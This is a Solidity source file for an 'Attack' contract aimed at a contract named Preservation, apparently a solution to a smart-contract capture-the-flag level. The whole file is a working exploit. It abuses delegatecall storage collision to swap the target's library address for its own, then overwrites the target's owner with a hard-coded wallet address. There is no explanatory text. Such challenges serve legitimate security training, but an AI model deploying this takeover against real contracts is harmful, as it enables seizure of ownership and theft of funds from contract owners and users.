// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Target.sol";

contract Attack {
    Preservation public target;
    address irrelevant;
    address public owner;
    uint storedTime;

    constructor(address _to_call) {
        target = Preservation(_to_call);
        owner = payable(msg.sender);
    }

    function attack1() public {
        target.setFirstTime(uint(uint160(address(this))));
        target.setFirstTime(1);
    }

    function setTime(uint _time) public {
        owner = address(0x2C17A5f47FF94Be930E74483BDa8FE0D3616AA1E);
    }
}
